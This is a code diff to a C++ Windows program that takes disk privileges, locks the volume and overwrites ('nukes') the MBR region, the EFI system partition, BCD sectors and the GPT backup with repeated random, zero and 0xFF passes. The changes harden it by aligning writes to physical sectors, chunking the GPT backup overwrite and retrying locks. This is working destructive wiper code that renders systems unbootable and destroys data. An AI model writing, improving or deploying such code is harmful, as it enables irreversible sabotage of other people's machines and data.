@@ -24,8 +24,12 @@ bool OverwriteSector(HANDLE hDisk, LARGE_INTEGER offset, BYTE* buffer, DWORD siz
             return true;
         }
         errorCode = GetLastError();
+        if (errorCode == ERROR_SECTOR_NOT_FOUND || errorCode == ERROR_GEN_FAILURE) {
+            std::cerr << "Warning: Skipping " << passName << " due to critical error (Code: " << errorCode << ", attempt " << attempt + 1 << ").\n";
+            return false;
+        }
         std::cerr << "Warning: Failed to write " << passName << " (Code: " << errorCode << ", attempt " << attempt + 1 << ").\n";
-        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
+        std::this_thread::sleep_for(std::chrono::milliseconds(500));
     }
     return false;
 }
@@ -68,6 +72,17 @@ bool UpdateDiskProperties(HANDLE hDisk, DWORD& errorCode) {
     errorCode = GetLastError();
     std::cerr << "Warning: Failed to update disk properties (Code: " << errorCode << ").\n";
     return false;
+}
+
+DWORD GetPhysicalSectorSize(HANDLE hDisk) {
+    STORAGE_PROPERTY_QUERY query = { StorageAccessAlignmentProperty, PropertyStandardQuery };
+    STORAGE_ACCESS_ALIGNMENT_DESCRIPTOR alignment = {0};
+    DWORD bytesReturned;
+    if (DeviceIoControl(hDisk, IOCTL_STORAGE_QUERY_PROPERTY, &query, sizeof(query), &alignment, sizeof(alignment), &bytesReturned, nullptr)) {
+        return alignment.BytesPerPhysicalSector;
+    }
+    std::cerr << "Warning: Failed to query physical sector size, defaulting to 4096 bytes (Code: " << GetLastError() << ").\n";
+    return 4096; // Default for modern drives
 }
 
 bool EnablePrivilege(const wchar_t* privilege) {
@@ -252,11 +267,13 @@ int main() {
     const int SECTOR_SIZE = 512;
     const int SECTORS_TO_NUKE = 2048; // 1 MB
     const int GPT_BACKUP_SECTORS = 256;
+    const int GPT_CHUNK_SECTORS = 32; // 16 KB chunks
+    const int GPT_CHUNKS = GPT_BACKUP_SECTORS / GPT_CHUNK_SECTORS; // 8 chunks
     const int ESP_SECTORS = 100; // Extended
     const int BCD_SECTORS = 5; // Sectors 10-14
     BYTE* buffer = new BYTE[SECTOR_SIZE * SECTORS_TO_NUKE];
     if (!buffer) WriteError("Failed to allocate buffer", 0);
-    BYTE* gptBuffer = new BYTE[SECTOR_SIZE * GPT_BACKUP_SECTORS];
+    BYTE* gptBuffer = new BYTE[SECTOR_SIZE * GPT_CHUNK_SECTORS];
     if (!gptBuffer) WriteError("Failed to allocate GPT buffer", 0);
 
     std::random_device rd;
@@ -323,30 +340,41 @@ int main() {
 
     // Nuke GPT Backup
     if (isGPT) {
+        DWORD physicalSectorSize = GetPhysicalSectorSize(hDisk);
         LARGE_INTEGER gptBackupOffset;
         gptBackupOffset.QuadPart = diskGeometry.DiskSize.QuadPart - SECTOR_SIZE * GPT_BACKUP_SECTORS;
+        gptBackupOffset.QuadPart = (gptBackupOffset.QuadPart / physicalSectorSize) * physicalSectorSize; // Align to physical sector
         if (gptBackupOffset.QuadPart < 0 || gptBackupOffset.QuadPart + SECTOR_SIZE * GPT_BACKUP_SECTORS > diskGeometry.DiskSize.QuadPart) {
             std::cerr << "Warning: Invalid GPT backup offset, skipping GPT Backup nuke.\n";
             status[1].success = false;
             status[1].errorCode = 0;
             status[1].errorMsg = "Invalid offset";
         } else {
-            if (LockVolume(hDisk, errorCode, 5)) {
+            if (LockVolume(hDisk, errorCode, 8)) {
                 for (int pass = 0; pass < 4; ++pass) {
                     if (pass == 0 || pass == 3) {
-                        for (int i = 0; i < SECTOR_SIZE * GPT_BACKUP_SECTORS; ++i) gptBuffer[i] = dis(gen);
+                        for (int i = 0; i < SECTOR_SIZE * GPT_CHUNK_SECTORS; ++i) gptBuffer[i] = dis(gen);
                     } else if (pass == 1) {
-                        ZeroMemory(gptBuffer, SECTOR_SIZE * GPT_BACKUP_SECTORS);
+                        ZeroMemory(gptBuffer, SECTOR_SIZE * GPT_CHUNK_SECTORS);
                     } else {
-                        memset(gptBuffer, 0xFF, SECTOR_SIZE * GPT_BACKUP_SECTORS);
+                        memset(gptBuffer, 0xFF, SECTOR_SIZE * GPT_CHUNK_SECTORS);
                     }
-                    if (!OverwriteSector(hDisk, gptBackupOffset, gptBuffer, SECTOR_SIZE * GPT_BACKUP_SECTORS, 
-                                        pass == 0 ? "GPT backup random pass 1" : pass == 1 ? "GPT backup zero pass" : 
-                                        pass == 2 ? "GPT backup ones pass" : "GPT backup random pass 2", errorCode)) {
-                        status[1].success = false;
-                        status[1].errorCode = errorCode;
-                        status[1].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
+                    bool chunkSuccess = true;
+                    for (int chunk = 0; chunk < GPT_CHUNKS; ++chunk) {
+                        LARGE_INTEGER chunkOffset;
+                        chunkOffset.QuadPart = gptBackupOffset.QuadPart + chunk * SECTOR_SIZE * GPT_CHUNK_SECTORS;
+                        if (!OverwriteSector(hDisk, chunkOffset, gptBuffer, SECTOR_SIZE * GPT_CHUNK_SECTORS, 
+                                            pass == 0 ? ("GPT backup random pass 1, chunk " + std::to_string(chunk + 1)).c_str() :
+                                            pass == 1 ? ("GPT backup zero pass, chunk " + std::to_string(chunk + 1)).c_str() :
+                                            pass == 2 ? ("GPT backup ones pass, chunk " + std::to_string(chunk + 1)).c_str() :
+                                            ("GPT backup random pass 2, chunk " + std::to_string(chunk + 1)).c_str(), errorCode)) {
+                            chunkSuccess = false;
+                            status[1].success = false;
+                            status[1].errorCode = errorCode;
+                            status[1].errorMsg = errorCode == 5 ? "Access Denied" : "Unknown error";
+                        }
                     }
+                    if (!chunkSuccess) break;
                     std::this_thread::sleep_for(std::chrono::milliseconds(500));
                 }
                 DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
